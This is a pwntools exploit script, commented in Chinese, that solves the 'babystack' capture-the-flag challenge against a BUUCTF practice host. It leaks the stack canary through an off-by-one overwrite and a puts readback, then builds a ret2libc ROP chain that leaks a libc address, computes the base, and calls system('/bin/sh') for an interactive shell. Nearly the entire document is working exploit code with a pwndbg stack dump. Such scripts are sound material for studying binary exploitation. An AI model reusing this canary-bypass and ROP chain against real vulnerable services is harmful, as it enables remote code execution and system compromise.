'''
# 开启了CANARY保护，不能直接溢出
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
'''
from pwn import *

r = remote('node5.buuoj.cn', 29222)
# r = process(r'./babystack')
elf = ELF(r'./babystack')
libc = ELF(r'../libc/libc6_2.23-0ubuntu11_amd64.so')
context.log_level = 'debug'

main_addr = 0x400908
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi = 0x400a93
ret = 0x40067e

# 先利用puts函数泄露canary的地址（rbp-8）,即canary的地址在rbp后一个, puts函数遇到\x00才停止输出
# s到rbp的距离是0x90，所以s到canary的距离就是0x90-9=0x88
'''
wndbg> stack 30
00:0000│ rsp     0x7ffd8d4c0330 ◂— 0x800
01:0008│-098     0x7ffd8d4c0338 ◂— 0x200d20000
02:0010│ rax rdi 0x7ffd8d4c0340 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓            15 skipped
12:0090│-010     0x7ffd8d4c03c0 ◂— 0x4241414141414141 ('AAAAAAAB')
13:0098│-008     0x7ffd8d4c03c8 ◂— 0x7e26ae80ccd4d10a  <-----------------------------
14:00a0│ rbp     0x7ffd8d4c03d0 —▸ 0x7ffd8d4c0470 —▸ 0x7ffd8d4c04d0 ◂— 0
'''
# canary的大小在64位中是8个字节，但最后一位是截断符\x0a（小端序）
# 因此要多一个字符'B'覆盖canary的截断符使得能够正常用puts函数泄露canary
payload1 = b'A' * 0x88 + b'B'
r.sendlineafter(b'>> ', b'1')
r.send(payload1)
r.sendlineafter(b'>> ', b'2')
r.recvuntil(b'AB')
# r.recv(0x89)
'''
# 或者使用回车行覆盖也行
payload1 = b'A' * 0x88
r.sendlineafter(b'>> ', b'1')
r.sendline(payload1)
r.sendlineafter(b'>> ', b'2')
r.recvuntil(b'A\n')
'''
canary_addr = u64(r.recv(7).rjust(8, b'\x00'))  # 注意是rjust
print(hex(canary_addr))

payload2 = b'A' * 0x88 + p64(canary_addr) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
r.sendlineafter(b'>> ', b'1')
r.send(payload2)
r.sendlineafter(b'>> ', b'3')  # 跳出while循环执行ret2libc
puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
# puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.sym['puts']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

payload3 = b'A' * 0x88 + p64(canary_addr) + p64(0) + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
r.sendlineafter(b'>> ', b'1')
r.send(payload3)
r.sendlineafter(b'>> ', b'3')
r.interactive()
